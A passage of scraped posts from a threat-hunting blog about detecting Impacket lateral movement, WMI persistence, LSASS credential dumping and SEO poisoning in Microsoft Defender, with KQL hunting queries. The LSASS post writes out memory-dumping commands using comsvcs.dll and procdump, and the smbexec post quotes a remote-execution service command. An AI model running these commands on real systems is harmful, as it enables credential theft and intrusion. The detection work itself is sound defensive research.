    "body": "2024/04/27 - Hello mr. Impacket – I am back!Today I will write about Impacket. Last time I wrote about the psexec and smbexec modules which I found to be the most logical start to the series (BTW I would like to remind that 2 posts can be series).  You know, it is a gift which keeps on giving.  WMI, I choose you: Today, I would like to start with couple of the WMI based modules. I have some experience when it comes to WMI based attacks, especially the basics. However this is a good opportunity for me to learn more from the subject. Let’s start with wmiexec, another way to gain shell access to the target. This one should be more stealthy than the two which I was writing about in the part 1. So I decided to execute whoami with the silentcommand option. This means that there will be no output, however the actual whoami command will be executed. I tried to run this a bit more stealthy to see if Defender will alert about this with a Christmas tree similar to psexec and smbexec. It did not – there was no alert of this activity. However this seems to be relatively straight forward to hunt for. It is just a command being executed through WMI so there is good telemetry available from this activity. The whoami. exe process is being executed as a child of wmiprvse. exe. Also the DeviceEvents table contains action ProcessCreatedUsingWmiQuery which straight up shows which process was launched with WMI. So maybe I turn the hunting to something which I think I did on the rare service hunts, find the rare processes started with WMI and find out what the processes are doing. I included only the process events and network events to the query but you can follow the logic to add further data. File creations for example could work well. To test the query I ran the following command.  I started to create the query using the ProcessCreatedUsingWMIQuery ActionType from the DeviceEvents table. I started by filtering to rare processes started with WMI: let LookupTime = 30d; let GetRareWMIProcessLaunches = materialize (DeviceEvents| where Timestamp &gt; ago(LookupTime)| where ActionType == @ ProcessCreatedUsingWmiQuery | where isnotempty(FileName)| summarize count() by SHA1, InitiatingProcessCommandLine| where count_ &lt; 5| distinct SHA1);The idea is to look for SHA1 + commandline combination which has been seen less than 5 times in the environment. I added CommandLine as the launched powershell. exe process was seen quite a few times in my testing environment – this is left up to you to tinker. The next parts of the query is then taking this filtered data and building results around the rare hits. First pulling the details out from the DeviceEvents table and then joining it to the Process and Network events. let LookupTime = 30d;let GetRareWMIProcessLaunches = materialize (DeviceEvents| where Timestamp &gt; ago(LookupTime)| where ActionType == @ ProcessCreatedUsingWmiQuery | where isnotempty(FileName)| summarize count() by SHA1, InitiatingProcessCommandLine| where count_ &lt; 5 | distinct SHA1); DeviceEvents | where Timestamp &gt; ago(LookupTime)| where ActionType == @ ProcessCreatedUsingWmiQuery | where SHA1 in~ (GetRareWMIProcessLaunches)| where isnotempty(FileName)| project DeviceName, WMIProcessLaunchTimestmap = Timestamp, ProcessLaunchedByWMI = tolower(FileName), ProcessLaunchedByWMICommandLine = tolower(ProcessCommandLine), ProcessLaunchedByWMICreationTime =  ProcessCreationTime, ProcessLaunchedByWMISHA1 = tolower(SHA1), ProcessLaunchedByWMIID = ProcessId, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentCreationTime, InitiatingProcessParentFileName| join kind=leftouter (DeviceProcessEvents| where Timestamp &gt; ago(LookupTime)| where InitiatingProcessSHA1 in~ (GetRareWMIProcessLaunches)|project DeviceName, ChildProcessTimestamp = Timestamp, ProcessLaunchedByWMI = tolower(InitiatingProcessFileName), ProcessLaunchedByWMICommandLine = tolower(InitiatingProcessCommandLine), ProcessLaunchedByWMICreationTime = InitiatingProcessCreationTime, ProcessLaunchedByWMISHA1 = tolower(InitiatingProcessSHA1), ProcessLaunchedByWMIID = InitiatingProcessId, WMIchild = FileName, WMIChildCommandline = ProcessCommandLine) on DeviceName, ProcessLaunchedByWMI, ProcessLaunchedByWMICommandLine, ProcessLaunchedByWMISHA1, ProcessLaunchedByWMIIDjoin kind=leftouter (DeviceNetworkEvents| where Timestamp &gt; ago(LookupTime)| where InitiatingProcessSHA1 in~ (GetRareWMIProcessLaunches)|project DeviceName, ChildProcessTimestamp = Timestamp, ProcessLaunchedByWMI = tolower(InitiatingProcessFileName), ProcessLaunchedByWMICommandLine = tolower(InitiatingProcessCommandLine), ProcessLaunchedByWMICreationTime = InitiatingProcessCreationTime, ProcessLaunchedByWMISHA1 = tolower(InitiatingProcessSHA1), ProcessLaunchedByWMIID = InitiatingProcessId, WMIProcessRemoteIP = RemoteIP, WMIProcessRemoteURL = RemoteUrl) on DeviceName, ProcessLaunchedByWMI, ProcessLaunchedByWMICommandLine, ProcessLaunchedByWMISHA1, ProcessLaunchedByWMIID| where isnotempty(WMIProcessRemoteIP) or isnotempty(WMIchild)| summarize ConnectedAddresses = make_set(WMIProcessRemoteIP), ConnectedURLs = make_set(WMIProcessRemoteURL), LaunchedProcessNames = make_set(WMIchild), LaunchedProcessCmdlines = make_set(WMIChildCommandline) by DeviceName, ProcessLaunchedByWMI, ProcessLaunchedByWMICommandLine, ProcessLaunchedByWMICreationTime, ProcessLaunchedByWMISHA1, ProcessLaunchedByWMIIDYou could potentially leave the let statement out and filter in the first DeviceEvents query, however it can be hard as you can’t use the process ID:s etc there as it would create only unique results in the end, which is why I decided to have the let statement in place. It also makes it easy to filter all the joins so it actually may be more efficient this way. I also included a filter which states that there has to be either a network connection or a child process otherwise the results are not shown. WMIpersist: The next WMI related tool I want to have a look at is wmipersist. This create a WMI event consumer/filter as a persistence method. It is one of the major ways to persist in Windows OS, however it is still much less used than the common three: services, scheduled tasks and runkeys. I’ve been hunting for WMI persistence for many times but I still want to have a look how this work when created with Impacket. I used the example from the wmipersist documentation: This raised an alert in Defender with title “A WMI event filter was bound to a suspicious event consumer“. It is very easy to find the action from the DeviceEvents table with the ActionType “WMIBindEventFilterToConsumer”. The relevant data is stored in the AdditionalFields field, where you can find the name of the consumer created and the data what it does: Binding EventFilter:instance of __EventFilter{CreatorSID = {1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0};EventNamespace = “root\\subscription”;Name = “EF_ASEC”;Query = “select * from __TimerEvent where TimerID = \”TI_ASEC\” “;QueryLanguage = “WQL”;};Perm. Consumer:instance of ActiveScriptEventConsumer{CreatorSID = {1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0};KillTimeout = 0;MaximumQueueSize = 0;Name = “ASEC”;ScriptingEngine = “VBScript”;ScriptText = “Dim objFS, objFile\nSet objFS = CreateObject(\”Scripting. FileSystemObject\”)\nSet objFile = objFS. OpenTextFile(\”C:\\ASEC. log\”, 8, true)\nobjFile. WriteLine \”Hey There!\”\nobjFile. Close\n”;};So this can be used as a basis for the hunt. This event is present in my testing environment only twice during the past 30 days, however in real environments it may be much more common. What sticks out from the second event is the Consumer type; it is ActiveScriptEventConsumer when running a script. So this is an easy filter. Other than that, it is pretty much looking at the name (which is available in the Consumer field), ScriptingEngine and the ScriptText – I ended up extracting those as their own fields with regex. It can still be a daunting task to state that yes this is malicious only from this information so further analysis is likely to be needed to determine if a hit is malicious. However depending on the environment the events can be rare – if there are a lot of results a statistical approach can be added to this query. I did not do that because I have no indications of how often this happens in the noisier environments thus I leave that part to the reader. let LookupTime = 30d;DeviceEvents| where Timestamp &gt; ago(LookupTime)| where ActionType ==  WmiBindEventFilterToConsumer | where AdditionalFields contains  ActiveScriptEventConsumer | extend Consumer = extractjson( $. Consumer , AdditionalFields, typeof(string)),ESS = extractjson( $. ESS , AdditionalFields, typeof(string)), Namespace = extractjson( $. Namespace , AdditionalFields, typeof(string)), PossibleCause = extractjson( $. PossibleCause , AdditionalFields, typeof(string))| extend ScriptText = extract(@'\ScriptText = (. *;)',1,PossibleCause), ScriptingEngine = extract(@'\ScriptingEngine = (. *;)',1,PossibleCause)| project-reorder Timestamp, DeviceName, Consumer, Namespace, ScriptingEngine, ScriptTextImpacket also offers the wmiquery option for querying information but I will leave that one out as it is not very interesting to hunt for. With that we have reached the end of the line for the WMI based modules of the Impacket tool. Bonus! Dcomexec: (I think) that Dcomexec is the last interactive shell option with Impacket that I have not explored yet which is why I decided to add that to this post. I executed similar activity as with wmiexec (PowerShell invoking webrequest to google. com and running whoami after). This is quite interesting though as it seems a bit stealthy from hunting perspective. I can see that first explorer is accepting connection from the KALI box on high ports (51823 -&gt; 62995) after which the PowerShell. exe is launched under explorer. exe. This makes it in my opinion interesting as it is quite similar to a user launching PowerShell on their desktop. I created a query which looks for the network connections first towards explorer. exe though I left out the high port filter. Then I joined the data to all processes which were created by the particular explorer. exe process, filtering to instances where the process has been started within a minute after the inbound connection. This resulted in a single hit, which was initiated with Impacket. After getting the wanted results I continued to enrich the data using the same methodology as with the first query within this post. I am looking into getting all the child processes &amp; network connections of the spawned process – you could also add things like registry events if you’d like. Finally the results looked like this: With the query a hunter is able to see all the remote IP addresses, Remote URLs, spawned process names and commandlines in a single line. This is to make the analysis faster and easier for the hunter as they do not have to analyze multiple lines to understand what the process has been doing.  Also this was a good reminder that the capitalization of the field contents are not constant within MDE so you need to use the tolower() function when joining using string fields. Without that I got no hits because the FolderPath was including capital letters on some tables. Also, no alert was raised of this activity – which was to be expected considering what the activity looks like on the endpoint. The final query: let LookupTime = 30d;DeviceNetworkEvents| where Timestamp &gt; ago(LookupTime)| where InitiatingProcessFileName =~  explorer. exe | where ActionType == 'InboundConnectionAccepted' | project InboundConnTimestamp = Timestamp, DeviceName, InboundConnectionToExplorer = RemoteIP, InitiatingProcessFileName, InitiatingProcessCreationTime, InitiatingProcessId| join kind=leftouter (DeviceProcessEvents| where Timestamp &gt; ago(LookupTime)| where InitiatingProcessFileName =~  explorer. exe | project ProcessStartTimestamp = Timestamp, DeviceName, StartedProcessCmdline = tolower(ProcessCommandLine), StartedProcessCreationTime = ProcessCreationTime, StartedProcessId = ProcessId, StartedProcessFileName = tolower(FileName), StartedProcessFolderPath = tolower(FolderPath), InitiatingProcessFileName, InitiatingProcessCreationTime, InitiatingProcessId) on DeviceName, InitiatingProcessFileName, InitiatingProcessCreationTime, InitiatingProcessId| where ProcessStartTimestamp between (InboundConnTimestamp . . (InboundConnTimestamp + 1m))| join kind=leftouter ( DeviceProcessEvents | where Timestamp &gt; ago(LookupTime) | where InitiatingProcessParentFileName =~  explorer. exe |project DeviceName, ChildProcessTimestamp = Timestamp, StartedProcessCmdline = tolower(InitiatingProcessCommandLine), StartedProcessCreationTime = InitiatingProcessCreationTime, StartedProcessId = InitiatingProcessId, StartedProcessFileName = tolower(InitiatingProcessFileName), StartedProcessFolderPath = tolower(InitiatingProcessFolderPath), ChildProcessId= ProcessId, ChildProcessName = FileName, ChildProcessCommandLine = ProcessCommandLine ) on DeviceName, StartedProcessCmdline, StartedProcessCreationTime, StartedProcessId, StartedProcessFileName, StartedProcessFolderPath| join kind=leftouter ( DeviceNetworkEvents | where Timestamp &gt; ago(LookupTime) | where InitiatingProcessParentFileName =~  explorer. exe |project DeviceName, ChildProcessTimestamp = Timestamp, StartedProcessCmdline = tolower(InitiatingProcessCommandLine), StartedProcessCreationTime = InitiatingProcessCreationTime, StartedProcessId = InitiatingProcessId, StartedProcessFileName = tolower(InitiatingProcessFileName), StartedProcessFolderPath = tolower(InitiatingProcessFolderPath), RemoteIP, RemoteUrl) on DeviceName, StartedProcessCmdline, StartedProcessCreationTime, StartedProcessId, StartedProcessFileName, StartedProcessFolderPath| summarize ConnectedAddresses = make_set(RemoteIP), ConnectedUrl = make_set(RemoteUrl), ChildProcesses = make_set(ChildProcessName), ChildProcessCmdlines = make_set(ChildProcessCommandLine) by DeviceName, InitiatingSourceIP = InboundConnectionToExplorer, StartedProcessCmdline, StartedProcessCreationTime, StartedProcessId, StartedProcessFileName, StartedProcessFolderPath, Timestamp = InboundConnTimestampThere we have couple more Impacket modules explored and hunting queries created in attempts to catch them. There is a lot more to Impacket and the options are quite broad on what you can achieve with it. I do still have some modules left which I may be interested in so there is a chance that the series will have a third part. That’s it for now folks, happy hunting! MS PRs:WmiExec WmiPersist DcomExec My GitHub page "
    }, {
    "id": 23,
    "url": "https://threathunt.blog/impacket-psexec/",
    "title": "Exploring hunting options for catching Impacket",
    "body": "2024/04/13 - Hunting for usage of ImpacketImpacket is one of those tools which the threat actors are constantly using during the attacks. It is interesting tool as it allows interacting with several protocols with Python. It, for example, allows for a PsExec like behavior which is very often one of the key tools the threats use Impacket for. The tools has actually multiple different methods to do this. The tool also has features like secretsdump which tries to dump credentials from a remote host, WMI based interactive shell and many others. My approach to see if I can catch this is to launch the attack from a non monitored device targeting a device which has the Defender for Endpoint agent installed. Then I am having a look what happens on the device to which the Impacket based attack is targeted to. While I was writing this post I quickly noticed that this needs to be released in multiple parts as there are quite a few features - and even when I touched the ones which I understand the best it took a good while to go through them.  PsExec. py and smbexec. py: These two offers the capabilities similar to PsExec. These have been used in the wild by the threat actors to get access to remote hosts within a Windows environment so it is interesting to see how the behavior is like on the host to which the attack is targeted to. I think the PsExec. py will be relatively similar to the normal PsExec, writing a service to the target device but we will see. As I have never used Impacket before it is also interesting to see the options available. Impacket supports several authentication methods, username/password, hashes, kerberos authentication using cached information and AES key for kerberos authentication. Also you can change the name of the binary which will be used in the target machine if you wish. Here is how the output looks like when running with username/password combo without changing any settings: PsExec module with default settings. The activity was detected by Microsoft Defender with the alert subject of “An active ‘RemoteExec’ malware was detected on one endpoint”. Good boy Defender, though it is possible it was only detected because the binary is being flagged, not by the behavior. Here is the alert story which is actually kinda great, but because it is revolving around the actual binary dropped to the target I think the alert may raise only because the binary is flagged malicious: Impacket psexec module alert story on MDE Starting to think of different threat hunting angles and the easiest one here comes with the look into the NamedPipeEvents. Apparently the named pipe created here always has a reference to RemCom - which is very easy to spot with the following query: let lookuptime = 30d;DeviceEvents| where ActionType == @ NamedPipeEvent | where Timestamp &gt;ago(lookuptime)| project NamedPipeTimeStamp = Timestamp, NamedPipeProcess = InitiatingProcessFileName, NamedPipeProcessId = InitiatingProcessId, NamedPipeProcessStartTime = InitiatingProcessCreationTime, NamedPipeProcessSHA1 = InitiatingProcessSHA1, FileOperation=extractjson( $. FileOperation , AdditionalFields, typeof(string)), NamedPipeEnd=extractjson( $. NamedPipeEnd , AdditionalFields, typeof(string)), PipeName=extractjson( $. PipeName , AdditionalFields, typeof(string))| where PipeName contains  RemCom I wanted to create something not based on the string so I started to create a query using several steps which the activity includes. First I added the namedpipe created by ntoskrnl. exe. Which was great, until I tried to join to the file creation event, which did not work. Why you may ask? Well the reason is that on the DeviceEvents table the InitiatingProcessFileName is ntoskrnl. exe BUT on FileEvents table it is system. And this is the same process doing the activity but the name is inconsistent across the tables. Worry not, we can workaround by using the folderpath instead of filename. let lookuptime = 30d;let RareFilesCreated =DeviceFileEvents| where ActionType == 'FileCreated'| where Timestamp &gt;ago(lookuptime)| where InitiatingProcessFolderPath == @ c:\windows\system32\ntoskrnl. exe | summarize count() by SHA1| where count_ &lt; 3 | distinct SHA1; DeviceEvents | where Timestamp &gt;ago(lookuptime)| where InitiatingProcessFolderPath == @ c:\windows\system32\ntoskrnl. exe | where ActionType == @ NamedPipeEvent | project NamedPipeTimeStamp = Timestamp, NamedPipeProcess = InitiatingProcessFileName, NamedPipeProcessId = InitiatingProcessId, NamedPipeProcessStartTime = InitiatingProcessCreationTime, NamedPipeProcessSHA1 = InitiatingProcessSHA1, FileOperation=extractjson( $. FileOperation , AdditionalFields, typeof(string)), NamedPipeEnd=extractjson( $. NamedPipeEnd , AdditionalFields, typeof(string)), PipeName=extractjson( $. PipeName , AdditionalFields, typeof(string))| join (DeviceFileEvents| where Timestamp &gt;ago(lookuptime)| where InitiatingProcessFolderPath == @ c:\windows\system32\ntoskrnl. exe | where ActionType == 'FileCreated' | where SHA1 in~ (RareFilesCreated)| project FileCreationTimestamp = Timestamp, NamedPipeProcess = InitiatingProcessFileName, NamedPipeProcessId = InitiatingProcessId, NamedPipeProcessStartTime = InitiatingProcessCreationTime, NamedPipeProcessSHA1 = InitiatingProcessSHA1, FileCreated = FileName, FileCreatedSHA1 = SHA1, FileCreatedFolder = FolderPath) on NamedPipeProcessId, NamedPipeProcessSHA1, NamedPipeProcessStartTime| project-away NamedPipeProcessId1, NamedPipeProcessSHA1, NamedPipeProcessStartTime1There are options at this point. You could look into the service creation or launch of the rare process which was created on to the target system. Or you could even add both if feeling especially adventurous, though I am quite sure that the reality is that it will get too resource heavy. I used the Process Creation as it is a bit easier. I also changed the join kinds to leftouter to see all results from left and only matching from right. I don’t want to get multiple lines from single event which is why I grouped the NamedPipes and timestamps with summarize on the final line. let lookuptime = 30d;let RareFilesCreated =DeviceFileEvents| where ActionType == 'FileCreated'| where Timestamp &gt;ago(lookuptime)| where InitiatingProcessFolderPath == @ c:\windows\system32\ntoskrnl. exe | summarize count() by SHA1| where count_ &lt; 3 | distinct SHA1; DeviceEvents | where Timestamp &gt;ago(lookuptime)| where InitiatingProcessFolderPath == @ c:\windows\system32\ntoskrnl. exe | where ActionType == @ NamedPipeEvent | project DeviceName, NamedPipeTimeStamp = Timestamp, NamedPipeProcess = InitiatingProcessFileName, NamedPipeProcessId = InitiatingProcessId, NamedPipeProcessStartTime = InitiatingProcessCreationTime, NamedPipeProcessSHA1 = InitiatingProcessSHA1, FileOperation=extractjson( $. FileOperation , AdditionalFields, typeof(string)), NamedPipeEnd=extractjson( $. NamedPipeEnd , AdditionalFields, typeof(string)), PipeName=extractjson( $. PipeName , AdditionalFields, typeof(string))| join kind=leftouter (DeviceFileEvents| where Timestamp &gt;ago(lookuptime)| where InitiatingProcessFolderPath == @ c:\windows\system32\ntoskrnl. exe | where ActionType == 'FileCreated' | where SHA1 in~ (RareFilesCreated)| project DeviceName, FileCreationTimestamp = Timestamp, NamedPipeProcess = InitiatingProcessFileName, NamedPipeProcessId = InitiatingProcessId, NamedPipeProcessStartTime = InitiatingProcessCreationTime, NamedPipeProcessSHA1 = InitiatingProcessSHA1, FileCreated = FileName, FileCreatedSHA1 = SHA1, FileCreatedFolder = FolderPath) on NamedPipeProcessId, NamedPipeProcessSHA1, NamedPipeProcessStartTime| project-away NamedPipeProcessId1, NamedPipeProcessSHA11, NamedPipeProcessStartTime1| join kind=leftouter (DeviceProcessEvents| where Timestamp &gt;ago(lookuptime)| where InitiatingProcessFileName =~  services. exe | where SHA1 in~ (RareFilesCreated)| project DeviceName, FileCreated = FileName, FileCreatedSHA1 = SHA1, FileCreatedFolder = FolderPath, StartedProcessCommandLine = ProcessCommandLine, StartedProcessName = FileName, StartedProcessSHA1 = SHA1, StartedProcessParent = InitiatingProcessFileName, StartedProcessTimestamp = Timestamp) on FileCreated, FileCreatedSHA1, FileCreatedFolder| where StartedProcessTimestamp between (NamedPipeTimeStamp . . (NamedPipeTimeStamp+1m))| project-away FileCreated1, FileCreatedSHA11, NamedPipeProcess1, DeviceName1, DeviceName2, FileCreatedSHA11| summarize NamedPipes = make_set(PipeName), StartedProcessTimestamps = make_set(StartedProcessTimestamp), NamedPipeTimeStamps = make_set(NamedPipeTimeStamp) by DeviceName, NamedPipeProcess, NamedPipeProcessId, NamedPipeProcessSHA1, FileCreated, FileCreatedSHA1, FileCreatedFolder, StartedProcessCommandLine, StartedProcessName, StartedProcessSHA1, StartedProcessParentMoving on to the smbexec. It is less verbose when executed but essentially it is the same which is why I do not add a picture of the shell running the command. I am quite interested to see how much this differs from the RemCom based module though.   Defender was super unhappy with this one and immediately detected it as Impacket: Hands on keyboard activity as alerted by Defender when running smbexec Sooooo yeah, a lot of details also included. What is more interesting is that with default settings the Defender XDR started remediation already without asking me. It was stated that the user account was disabled (though I don’t know how as it is an AD account and I have no Defender for Identity installed). Nevertheless, my RDP connection was dropped and denied shortly after. While browsing the GUI of Defender I found this: Contains the user account by enforcing a policy that prevents or terminates remote activity initiated by potentially compromised accounts through commonly used protocols associated with lateral movement. It might take a few minutes for this change to take effect. See Action Center for more information. Cool! I am assuming that it would do the action for all the devices to which the agent is installed, however as this is the only device on my instance it is hard to verify. Love the feature though, I am all for automating response on the events which are very likely true positive like this. The next thing was to look for how to lift this. Took a while but then I found the undo button from the action center where the defender took action. So what about hunting? To me this seems so so noisy that I can’t be bothered with creating elaborate hunting rules against this. It is using cmd. exe to run the commands as a service. So basically it is creating a service with the ImagePath being set to something really obvious, like this: %COMSPEC% /Q /c echo cd ^&gt; \\%COMPUTERNAME%\C$\__output 2^&gt;^&amp;1 &gt; %SYSTEMROOT%\gAIxopkL. bat &amp; %COMSPEC% /Q /c %SYSTEMROOT%\gAIxopkL. bat &amp; del %SYSTEMROOT%\gAIxopkL. bat Queries looking for service creation anomalies should spot this easily. They probably spot the psexec one too but it isn’t as obvious especially if the binary name is being changed. The rare service creation query which I posted earlier is able to catch this nicely and it immediately should raise red flags for the hunters. I will stop here for now and continue on inspecting the Impacket modules on Part 2 - to be released another date. Happy hunting! Microsoft GitHub PR My Github page "
    }, {
    "id": 24,
    "url": "https://threathunt.blog/lsass-credential-dumping/",
    "title": "Threat hunting for signs of credential dumping",
    "body": "2024/03/11 - Why this topic?I chose this topic because I’ve seen a lot of different queries to hunt for signs of credential dumping. However, these have been mostly developed around finding certain tools which do dump the credentials. My idea was to try to hunt for the activity done by the application which dumps the memory of a process (lsass. exe in this example). Then the hunting query could be used to hunt the actual activity and not rely on the actual application which dumps the memory. To get started I needed to generate data. I needed to see what the actual dumps looks a like by different applications.  Generating data by dumping lsass. exe memory: Let’s start with the easiest option. Task manager: Task manager used to dump lsass memory The next dump I created with comsvc. dll by initiating this command: rundll32. exe C:\windows\System32\comsvcs. dll, MiniDump 804 lsass. dmp full - where the number after MiniDump is the Process ID for the lsass. exe process. One more before moving on to the hunting, which is systeinernals Procdump tool: procdump. exe -accepteula -ma lsass. exe lsass. dmp. All the tools worked fine in dumping the lsass. exe when ran from an admin prompt. Good to note though that the MDE console was really red after: MDE console colored red with danger  Creating the query: Now that we have some data available we can start creating a query to hunt for the activity. First, I want to have an overview of which kind of activity the processes are doing. I created a very simple query to list Actions and FileNames by the processes of interest: search in (DeviceProcessEvents,DeviceNetworkEvents,DeviceFileEvents,DeviceRegistryEvents,DeviceLogonEvents,DeviceImageLoadEvents,DeviceEvents)Timestamp &gt;ago(3h)and DeviceId ==  ce8a64b7d864137ed1bf633d8fac1e2e1bcae92c and InitiatingProcessFileName has_any( taskmgr. exe , procdump64. exe , rundll32. exe )| sort by Timestamp desc| summarize Actions = make_set(ActionType), FileNames = make_set(FileName) by InitiatingProcessFileName, InitiatingProcessId, InitiatingProcessCommandLine, InitiatingProcessCreationTimeThis produces a simple overview of actions taken by the processes in question: Overview of processes which dumped the lsass memory What I can take from this then? Well All of them are creating files. The name of the created file is always lsass. dmp but it can be whatever else, so that is not a good indicator. Creating a file is. All of the processes are also creating the OpenProcessApiCall most likely targeting the lsass. exe process. Otherwise, there are no actions which wound unify all of the three actions. Not entirely true, there is the OtherAlertRelatedActivity. Obviously, this is not a good indicator though. Starting with the API call: let lookuptime = 30d;DeviceEvents| where Timestamp &gt;ago(lookuptime)| where ActionType ==  OpenProcessApiCall | where FileName =~  lsass. exe | project ApiCallTimestamp = Timestamp, InitiatingProcessFileName=tolower(InitiatingProcessFileName), InitiatingProcessCommandLine=tolower(InitiatingProcessCommandLine), InitiatingProcessId, InitiatingProcessCreationTime=tolower(InitiatingProcessCreationTime), InitiatingProcessParentFileName=tolower(InitiatingProcessParentFileName)Joining the data to file creation events. I needed to use the tolower() function which sets all the strings to lowercase - the join is case sensitive and it seems that for taskmgr. exe there were differences in capitalization on the tables. After using tolower() it worked fine and the results were shown for all the processes. It is also good to note that I filtered the event order - results will be only shown if the file is created within 1 minute after the API call. let lookuptime = 30d;DeviceEvents| where Timestamp &gt;ago(lookuptime)| where ActionType ==  OpenProcessApiCall | where FileName =~  lsass. exe | project ApiCallTimestamp = Timestamp, InitiatingProcessFileName=tolower(InitiatingProcessFileName), InitiatingProcessCommandLine=tolower(InitiatingProcessCommandLine), InitiatingProcessId, InitiatingProcessCreationTime=tolower(InitiatingProcessCreationTime), InitiatingProcessParentFileName=tolower(InitiatingProcessParentFileName)| join (DeviceFileEvents| where ActionType ==  FileCreated | where Timestamp &gt;ago(lookuptime)| project FileEventTimestamp = Timestamp, InitiatingProcessFileName=tolower(InitiatingProcessFileName), InitiatingProcessCommandLine=tolower(InitiatingProcessCommandLine), InitiatingProcessId, InitiatingProcessCreationTime=tolower(InitiatingProcessCreationTime), InitiatingProcessParentFileName=tolower(InitiatingProcessParentFileName), FileActionType = ActionType, FilePath = FolderPath, ModifiedFileName = FileName) on InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessId, InitiatingProcessCreationTime| where FileEventTimestamp between (ApiCallTimestamp . . (ApiCallTimestamp + 1m))| project ApiCallTimestamp, FileEventTimestamp, FilePath,FileActionType, ModifiedFileName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessId, InitiatingProcessParentFileNameHow about false-positives? Well first things first, this is straight out of my dev environment with 1 endpoint. There was NO actual False-Positives, though there were several file creation hits for procdump process: Results of the final query Woop woop. The query is producing meaningful results. The image is BTW from a query where I didn’t yet filter the ActionType to FileCreation which is why there are additional rows - was just too lazy to screenshot the latest version. That’s it folks, happy hunting! Microsoft GitHub PR My Github page "
    }, {
    "id": 25,
    "url": "https://threathunt.blog/hunt-seo-poisoning/",
    "title": "Hunting for signs of SEO poisoning",
    "body": "2024/02/23 - How to hunt for SEO poisoning? Well this is a good question to which I don’t have a good answer. This query is going to go through the very basics of how this can be started but it is not really that easy to do. I’ve had several different ideas of how to hunt for signs of SEO poisoning and the one in this post is the one that I think is most usable in the hunting scenarios. I have played around with a query which joins the file creation events to network events based on time - it does work but it is so opportunistic and causes a lot of noise from the network connections that I didn’t want to share that with you. So what is the idea of this query? It basically will look at all the certain files created by Browser processes, namely . exe, . msi and . zip. Then the files are  counted by SHA1 hash, FileOriginReferrerUrl and FileOriginUrl. The results are only shown if this combination is seen less than 4 times. The line 16 of the query is removing FileNames which contain “ChromeSetup” as this is causing noise as for some reason the SHA1 hash of legitimate Chrome installer is changing for each download. Some other applications are behaving similarly, which may be added to the query - a good to note is that for example TeamViewer seems to work in a similar fashion. Rare hash does not mean it would be malicious! There is an option to limit the FileNames to apps (line 18) which are often being mimicked by the SEO poisoning attacks but this is such a huge number of applications that I wouldn’t do it unless the noise is unbearable otherwise. Finally the FileProfile function is used to pull more information with the SHA1 hash. Good to note that the maximum number of results for this function is 1000. let LookupTime = 30d;let BrowserApps = pack_array( opera. exe , chrome. exe , firefox. exe , msedge. exe , iexplore. exe );DeviceFileEvents | where isnotempty(FileOriginUrl)| where Timestamp &gt; ago(LookupTime)| where InitiatingProcessFileName in~ (BrowserApps)| where FileName endswith  . exe  or FileName endswith  . msi  or FileName endswith  . zip // Remove noise by removing FileNames containing ChromeSetup. // Some apps (like Chrome installer) seems to have a  polymorphic  installers where the SHA1 hash is always different when the app is installed. Some Adobe products seem to behave similarly. | where FileName !contains  ChromeSetup // The following filter can be used to look for files with certain names. However, this can be hard as there is such a large number of files being mimicked in SEO poisoning attacks. //| where FileName contains  teamview  or FileName contains  windirstat | project DeviceName, Timestamp, ActionType, FileName, SHA1, FileOriginReferrerUrl, FileOriginUrl| summarize count() by FileName, SHA1, FileOriginReferrerUrl, FileOriginUrl| where count_ &lt; 4| invoke FileProfile(SHA1, 1000) | project-reorder FileName, SHA1, FileOriginReferrerUrl, FileOriginUrl, count_, GlobalPrevalence, GlobalFirstSeen, GlobalLastSeenAnalysisThe analysis should be based on the URL values combined to the file which has been downloaded. The hashes can be useful, especially if they are determined to be malicious. However, as explained before the hashes can’t be really determine to be abnormal based on the rarity. For some reason vendors have been changing to a model where the installer is unique for each of the downloads meaning that it always changes. This makes the analysis of this technique much harder. One way to remove noise from the query if its proven to be too noisy is to remove the SHA1 from the summarize altogether. A good note here is though, that the FileProfile function can’t be used anymore after removing the hash. However, a join back to the data could be used to get all the hashes back after counting but this is up for the reader to do. This query is far from perfect and the referrer values are not always present so the success may vary. However, this can still be used to look for signs of SEO poisoning attacks and can also find true-positives. Cheerio! Microsoft GitHub PR My Github page "
    }, {
    "id": 26,
    "url": "https://threathunt.blog/rare-process-launch-as-a-service/",
    "title": "Rare process launch as a service",
    "body": "2024/02/05 - Back after a long breakThe last post on this blog was published on mid-September 2023 so it has been a while since I was able to update the blog. The main reason for this is that I have been too busy. I’ve had extremely busy season at work and on top of that I also have had a lot of things to do in my personal life. Also, I’ve run a little low on ideas of what to post about. I have a draft which is relating around using the API of OpenCTI to use IOCs on other platforms, which I may or may not finish in the future. However, what inspired me to start blogging again is that I noticed that Microsoft is now offering directly the Defender for Endpoint P2 licenses which include the full defender for endpoint package, with advanced hunting. This gives me access to the platform with a relatively low price and as some of the readers may know I just absolutely love threat hunting with MDE / KQL. It is efficient and great language and the biggest limitation in my opinion is that the data is only available from the past 30 days. This should not be a problem for a continuous threat hunting program, however for those project based setups it can cause retention issues. That is however outside of the content of this post. So, what now that I have access to MDE advanced hunting? Well I will most likely start posting a little query here and there. My idea is to also add them to the official Microsoft repo (available here), if the process is not adding too much of overhead. This way they would be easier for anyone to utilize in the future as they are available from the Advanced Hunting GUI. I am hoping that this will require a little less effort for each of the posts, making it easier to post more frequently. I also do think that these could prove value to others more directly, which is a great motivator for me. I started by having a look at the older queries which I’ve been created and added the ones which I think can prove valuable to a single PR. The query of the day The query which I’d like to introduce today is all about launching code through a Windows service. I will go through the query function by function first. The query itself will be explained a little better at the last stage of the post, also where the full query is available. The first part of the query sets the lookup time. How long back do you want the query to go? The maximum is 30 days currently. Then we add the whitelisted processes to a pack_array called WhiteList. Next, we will materialize the basis of the query, as we will use this as basis of the statistical filter and join back to it. With materialize the  query does not need to be executed twice, saving calculations. let LookupTime = 30d; let WhiteList = pack_array( svchost. exe , mssense. exe , msmpeng. exe , searchindexer. exe , microsoftedgeupdate. exe );let GetServices = materialize (DeviceProcessEvents| where Timestamp &gt; ago(LookupTime)| where InitiatingProcessParentFileName contains  services. exe | where InitiatingProcessFileName !in~(WhiteList)| project Timestamp, DeviceName, StartedChildProcess = FileName, StartedChildProcessSHA1 = SHA1, StartedChildProcessCmdline = ProcessCommandLine, ServiceProcessSHA1 = InitiatingProcessSHA1, ServiceProcess = InitiatingProcessFileName, 